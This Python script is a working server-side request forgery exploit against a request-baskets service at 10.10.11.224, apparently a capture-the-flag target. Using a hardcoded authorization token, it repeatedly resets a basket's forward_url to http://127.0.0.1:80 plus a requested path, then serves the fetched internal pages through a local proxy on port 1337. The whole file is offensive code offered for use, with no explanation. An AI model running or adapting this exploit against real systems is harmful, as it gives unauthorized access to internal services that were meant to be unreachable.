from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
import requests
import mimetypes
import posixpath 

basket = 'yesterday'  # Basket identifier
path = '/'  # Path for the forward URL
ip = '10.10.11.224'  # IP address
token = '9-CSIiJmEZBEMan8Kpzph1ruRwOiAC-nR5c90XUldVpL'  # Authorization token

def change_forward_url(path):
    url = f'http://' + ip + ':55555/api/baskets/' + basket  # URL for updating forward URL
    headers = {
        'Authorization': token
    }
    data = {
        'forward_url': 'http://127.0.0.1:80' + path,
        'proxy_response': True,
        'insecure_tls': False,
        'expand_path': True,
        'capacity': 250
    }

    response = requests.put(url, headers=headers, json=data)

    if response.status_code == 204:
        print('Changing forward URL - http://127.0.0.1:80', path)
        return True
    else:
        print('An error occurred while executing the request.')
        print('Status code:', response.status_code)
        print('Response text:', response.text)
        return False

def get_request(path):
    change_forward_url(path)
    url = f'http://' + ip + ':55555/' + basket  # URL for GET request

    response = requests.get(url)

    if response.status_code == 200:
        print('Geting get request',path)
        return response
    else:
        print('An error occurred while executing the GET request.')
        print('Status code:', response.status_code)

# Start a simple HTTP server to serve the response from the last function in your browser
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        html = get_request(path)
        content_type = self.guess_type(path)

        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(html.content)

    def guess_type(self, path):
        base, ext = posixpath.splitext(path)
        if ext in mimetypes.types_map:
            return mimetypes.types_map[ext]
        return 'application/octet-stream'

def start_server():
    server_address = ('', 1337)
    httpd = HTTPServer(server_address, RequestHandler)
    print('Server running...')
    httpd.serve_forever()

start_server()